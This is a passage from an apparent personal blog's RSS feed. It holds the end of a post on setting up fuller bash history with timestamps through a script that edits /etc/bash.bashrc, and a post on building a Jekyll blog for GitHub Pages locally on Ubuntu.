&lt;p&gt;Another very important setting is the &lt;code class=&quot;language-text&quot;&gt;HISTFILESIZE&lt;/code&gt; configuration. This variable specifies the &lt;strong&gt;maximum number of lines&lt;/strong&gt;, which has a default value of &lt;code class=&quot;language-text&quot;&gt;500&lt;/code&gt;. This can be set to &lt;code class=&quot;language-text&quot;&gt;-1&lt;/code&gt; to remove the line count limit.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;# Set no limit for history file size
HISTFILESIZE=-1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Interestingly, there is another variable named &lt;code class=&quot;language-text&quot;&gt;HISTSIZE&lt;/code&gt; which has the exact same description as &lt;code class=&quot;language-text&quot;&gt;HISTFILESIZE&lt;/code&gt;. I have not tested it, but it seems prudent to also set this variable to a value of &lt;code class=&quot;language-text&quot;&gt;-1&lt;/code&gt; to remove any line count limit.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;# Set no limit for history file size
HISTSIZE=-1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;code class=&quot;language-text&quot;&gt;HISTCONTROL&lt;/code&gt; variable is used to control how commands are saved on the history list. Of the available configurations, the value of &lt;code class=&quot;language-text&quot;&gt;ignoredups&lt;/code&gt; causes lines matching the previous history entry to not be saved. Basically, do not save duplicates of the same command run twice (or more times) in succession.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;# Do not store a duplicate of the last entered command
HISTCONTROL=ignoredups&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;bash-configuration-overview&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#bash-configuration-overview&quot; aria-label=&quot;bash configuration overview permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;BASH Configuration Overview&lt;/h2&gt;
&lt;p&gt;There are three configuration methods to enhance BASH history:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Execute the commands at the prompt of the logged in user&lt;/li&gt;
&lt;li&gt;Enter the commands in a user’s &lt;code class=&quot;language-text&quot;&gt;.bashrc&lt;/code&gt; file&lt;/li&gt;
&lt;li&gt;Enter the commands in the system-wide &lt;code class=&quot;language-text&quot;&gt;.bashrc&lt;/code&gt; file&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The first option is to execute the specified commands can be executed directly in a shell. However, this approach will only set the configuration until the BASH session is exited. So, if you exit an SSH session, or log out, the configuration would be lost. &lt;/p&gt;
&lt;p&gt;The second option is to enter the commands into the &lt;code class=&quot;language-text&quot;&gt;.bashrc&lt;/code&gt; file of a specific user. This file present in the home directory of each user on the Linux system. For example, when logged in as &lt;code class=&quot;language-text&quot;&gt;nickfury&lt;/code&gt;, the file will be located at &lt;code class=&quot;language-text&quot;&gt;~/.bashrc&lt;/code&gt; or usually &lt;code class=&quot;language-text&quot;&gt;/home/nickfury/.bashrc&lt;/code&gt;, depending on the type of Linux OS installed.&lt;/p&gt;
&lt;p&gt;The third option is to enter the commands into the &lt;code class=&quot;language-text&quot;&gt;/etc/bash.bashrc&lt;/code&gt; file. This is the system-wide file for BASH configuration. This file is a shell script that BASH runs whenever it is started interactively. Therefore, it is run every time a BASH session is created, or whenever an SSH or TTY BASH session is started. &lt;/p&gt;
&lt;h2 id=&quot;a-bash-script-to-configure-enhanced-bash-history&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#a-bash-script-to-configure-enhanced-bash-history&quot; aria-label=&quot;a bash script to configure enhanced bash history permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;A BASH Script to Configure Enhanced BASH History&lt;/h2&gt;
&lt;p&gt;The full script I use for configuring BASH history is provided below for reference. This script applies all the configuration discussed above into the system-wide &lt;code class=&quot;language-text&quot;&gt;/etc/bash.bashrc&lt;/code&gt; file, so that the configuration is enabled for all users.&lt;/p&gt;
&lt;p&gt;I have performed testing on this configuration on an Ubuntu Linux 16.04.4 server system. I performed a variety of tests including accessing the VM from Virtual Machine Remote Console (VMRC), the normal Remote Console in a web browser, and through SSH using PuTTY and SSH client on an Ubuntu Desktop system. Everything ran smoothly, and I could see the history command, and &lt;code class=&quot;language-text&quot;&gt;.bash_history&lt;/code&gt; file updating for a variety of users. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;echo &quot;&gt;&gt;&gt; Starting&quot;
echo &quot;&gt;&gt;&gt; Loading configuration into /etc/bash.bashrc&quot;

echo &quot;HISTTIMEFORMAT=&apos;%F %T &apos;&quot; &gt;&gt; /etc/bash.bashrc
echo &apos;HISTFILESIZE=-1&apos; &gt;&gt; /etc/bash.bashrc
echo &apos;HISTSIZE=-1&apos; &gt;&gt; /etc/bash.bashrc
echo &apos;HISTCONTROL=ignoredups&apos; &gt;&gt; /etc/bash.bashrc

# Custom history configuration
echo &apos;# Configure BASH to append (rather than overwrite the history):&apos; &gt;&gt; /etc/bash.bashrc
echo &apos;shopt -s histappend&apos; &gt;&gt; /etc/bash.bashrc

echo &apos;# Attempt to save all lines of a multiple-line command in the same entry&apos; &gt;&gt; /etc/bash.bashrc
echo &apos;shopt -s cmdhist&apos; &gt;&gt; /etc/bash.bashrc

echo &apos;# After each command, append to the history file and reread it&apos; &gt;&gt; /etc/bash.bashrc
echo &apos;export PROMPT_COMMAND=&quot;${PROMPT_COMMAND:+$PROMPT_COMMAND$&quot;\n&quot;}history -a; history -c; history -r&quot;&apos; &gt;&gt; /etc/bash.bashrc

# Reload BASH for settings to take effect
echo &quot;&gt;&gt;&gt; Reloading BASH&quot;
exec &quot;$BASH&quot;

echo &quot;&gt;&gt;&gt; Finished. Exiting.&quot;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I have made a GitHub gist with the resultant script called &lt;a href=&quot;https://gist.github.com/thomaslaurenson/ae72d4b4ec683f5a1850d42338a9a4ab&quot;&gt;better_history.sh&lt;/a&gt;. This can be downloaded and run as the root user. An example of how to execute the script is provided below (for an Ubuntu system):&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo su
chmod u+x better_history.sh # permission to execute, if required
./better_history.sh
exit&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Finally, below is a small snippet of the expected output from the improved BASH history configuration.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;    1  2018-05-17 19:24:05 vim .bash_history
    2  2018-05-17 19:25:26 clear
    3  2018-05-17 19:25:50 vim validate_numbers.cpp
    4  2018-05-17 19:26:05 g++ validate_numbers.cpp -o validate_numbers
    5  2018-05-17 19:26:10 chmod u+x validate_numbers
    6  2018-05-17 19:26:12 ./validate_numbers
    7  2018-05-17 19:51:31 sudo poweroff&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Establishing a better BASH history configuration has made my life a lot easier. The script provided in this article is executed on every Linux system I use at work and in personal life to improve general well-being!&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Building a Jekyll-powered blog for GitHub pages]]></title><description><![CDATA[Contents Introduction Choosing a Framework Building Jekyll Websites Locally Introduction Throughout my life, I have started and half…]]></description><link>https://thomaslaurenson.com/blog/2018-06-30/building-a-new-Jekyll-powered-blog-for-GitHub-pages/</link><guid isPermaLink="false">https://thomaslaurenson.com/blog/2018-06-30/building-a-new-Jekyll-powered-blog-for-GitHub-pages/</guid><pubDate>Sat, 30 Jun 2018 00:00:00 GMT</pubDate><content:encoded>&lt;h2 id=&quot;contents&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#contents&quot; aria-label=&quot;contents permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contents&lt;/h2&gt;
&lt;div class=&quot;table-of-contents&quot;&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#choosing-a-framework&quot;&gt;Choosing a Framework&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#building-jekyll-websites-locally&quot;&gt;Building Jekyll Websites Locally&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h2 id=&quot;introduction&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#introduction&quot; aria-label=&quot;introduction permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Introduction&lt;/h2&gt;
&lt;p&gt;Throughout my life, I have started and half-accomplished making a blog on various occasions. I dabbled with WordPress… I didn’t like it. I tried Blogger… again, I couldn’t really get into it. I built my own static website with a blog and the maintenance was horrific! I guess that should have come as no surprise. There just didn’t seem to be a platform that I could really sink my teeth into. This changed when I discovered &lt;a href=&quot;https://jekyllrb.com/&quot;&gt;Jekyll&lt;/a&gt;.  &lt;/p&gt;
&lt;p&gt;The Jekyll platform really made sense to me. It was also fun to tinker with! But the best thing was writing in Markdown, a technology that was first &lt;a href=&quot;https://daringfireball.net/projects/markdown/&quot;&gt;release in 2004&lt;/a&gt;, and something I only discovered in 2016-ish. It seemed to take all the hassle out of writing HTML. And it suddenly seemed to be everywhere. I was writing Markdown in GitHub repository README.md files and constantly using it on Slack to format messages for the sanity of everyone. It was so simple and easy, with great formatting to boot. I took the plunge and developed a simple personal website using the Jekyll framework and GitHub pages as a host. It was supposed to be simple, and it was. I selected a default theme, &lt;a href=&quot;https://github.com/pages-themes/midnight&quot;&gt;Midnight&lt;/a&gt;, and performed some basic customization.&lt;/p&gt;
&lt;p&gt;I ran with this for a while, but it was time to change. I mean, it is not exactly a piece of art and greatly lacked functionality. The most important thing, it had no blog. I recently had some free time during the semester break and decided to update my online presence. My primary goals where:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A simple, elegant and sleek personal website&lt;/li&gt;
&lt;li&gt;The website should have a blog&lt;/li&gt;
&lt;li&gt;The blog should support comments&lt;/li&gt;
&lt;li&gt;The blog must be simple to deploy new content&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;choosing-a-framework&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#choosing-a-framework&quot; aria-label=&quot;choosing a framework permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Choosing a Framework&lt;/h2&gt;
&lt;p&gt;The title of this blog is a giveaway. I ended up selecting Jekyll and hosting on GitHub pages. However, this solution was not selected without due consideration. I dabbled with &lt;a href=&quot;https://gohugo.io/&quot;&gt;Hugo&lt;/a&gt; when building the &lt;a href=&quot;https://bit-project-sites.pages.op-bit.nz/iot/&quot;&gt;Internet of Things Dunedin&lt;/a&gt; project website, and quite enjoyed it. However, I wanted to host the website on GitHub. &lt;a href=&quot;https://gohugo.io/hosting-and-deployment/hosting-on-github/&quot;&gt;Hugo can be hosted on GitHub&lt;/a&gt;, but it doesn’t automatically build and deploy the &lt;em&gt;site&lt;/em&gt;. This was the primary reason for finally selecting Jekyll.&lt;/p&gt;
&lt;p&gt;Although I have decent web development skills (when really required), I didn’t want to build the site from the ground up. I mean why should I re-invent the wheel when it has been done countless times. &lt;/p&gt;
&lt;p&gt;I somehow stumbled on a simple website and blog combo that I liked, designed by &lt;a href=&quot;https://www.ybrikman.com/&quot;&gt;Yevgeniy Brikman&lt;/a&gt; authored in Jekyll specifically for GitHub. The style was simple and elegant. Perfect! After a quick investigation, Yevgeniy’s &lt;a href=&quot;https://github.com/brikis98/yevgeniy-brikman-homepage&quot;&gt;web site code&lt;/a&gt; is open source, licensed under a BSD License. &lt;/p&gt;
&lt;h2 id=&quot;building-jekyll-websites-locally&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#building-jekyll-websites-locally&quot; aria-label=&quot;building jekyll websites locally permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Building Jekyll Websites Locally&lt;/h2&gt;
&lt;p&gt;Building a Jekyll-powered website is relatively simple. It is so simple, that you do not have to build locally, and can push code to a GitHub repository (configured with GitHub pages) and the website will build itself. However, there can be bugs in the build process which can be hard to troubleshoot. From my experience, it is much simpler to build the website locally and faster to troubleshoot and add new content.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Lesson learned:&lt;/strong&gt; Build Jekyll websites locally!&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Although I primarily use Linux, I do have Microsoft Windows 10 installed for gaming and Office. I initially attempted to build my Jekyll website on Windows using Git-SCM and Ruby. This did not go well! I struggled with a variety of dependency issues and gem version issues, primarily with the &lt;code class=&quot;language-text&quot;&gt;nokogiri&lt;/code&gt; gem. After struggling for a while, I switched to my home Ubuntu Linux server to set up a Jekyll build environment and experienced no issues. &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Lesson learned:&lt;/strong&gt; Build Jekyll websites on Linux!&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The setup process to build Jekyll websites on Linux is quite simple. The &lt;a href=&quot;https://jekyllrb.com/docs/installation/&quot;&gt;full instructions are provided by Jekyll&lt;/a&gt; for Linux, Windows and OS X. Firstly, Ruby development version is required as well as the build essential package (which contains C/C++ compilers and tools). &lt;a href=&quot;https://bundler.io/&quot;&gt;Bundler&lt;/a&gt; is also required, which provides a consistent environment for Ruby projects by tracking and installing the exact gems and versions that are needed.&lt;/p&gt;
&lt;p&gt;The steps and required commands are outlined below:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Install some dependencies:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;sudo apt install ruby ruby-dev build-essential&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Install the bundle tool:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;gem install jekyll bundler&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Run the bundle tool:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;bundle install&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Build the website and serve it locally:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;bundle exec jekyll serve&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You should see output similar to that displayed below:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;Configuration file: /home/thomasl/thomaslaurenson.github.io/_config.yml
Configuration file: /home/thomasl/thomaslaurenson.github.io/_config.yml
            Source: /home/thomasl/thomaslaurenson.github.io
       Destination: /home/thomasl/thomaslaurenson.github.io/_site
 Incremental build: disabled. Enable with --incremental
      Generating...
                    done in 1.199 seconds.
 Auto-regeneration: enabled for &apos;/home/thomasl/thomaslaurenson.github.io&apos;
Configuration file: /home/thomasl/thomaslaurenson.github.io/_config.yml
    Server address: http://127.0.0.1:4000/
  Server running... press ctrl-c to stop.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now the site will be built and available on port 4000 on the localhost. Basically, you can open a web browser and view the website using the following address: &lt;code class=&quot;language-text&quot;&gt;http://127.0.0.1:4000/&lt;/code&gt;.  Furthermore, the built site will be in the &lt;code class=&quot;language-text&quot;&gt;_site&lt;/code&gt; directory. You can browse this directory and see the &lt;em&gt;compiled&lt;/em&gt; website consisting of HTML files that have been converted from Markdown.&lt;/p&gt;
&lt;p&gt;Some other useful build and serve commands are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Build the website and serve it on the local network:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;bundle exec jekyll serve --host 192.168.1.5&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;The IP address in the above example is the system where the Jekyll page is being built. In my case, it was my Ubuntu Linux server.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Only build changes made since the last build:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;bundle exec jekyll serve --incremental&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This was only a quick summary of the new personal website/blog that I have set up, not a full tutorial on setting up and deploying a Jekyll-powered website. There are many resources already available for this. I feel the takeaway of this post is to see the power of Jekyll for building static websites and blogs easily, not to build locally on Windows and to build, test and develop locally!&lt;/p&gt;</content:encoded></item></channel></rss>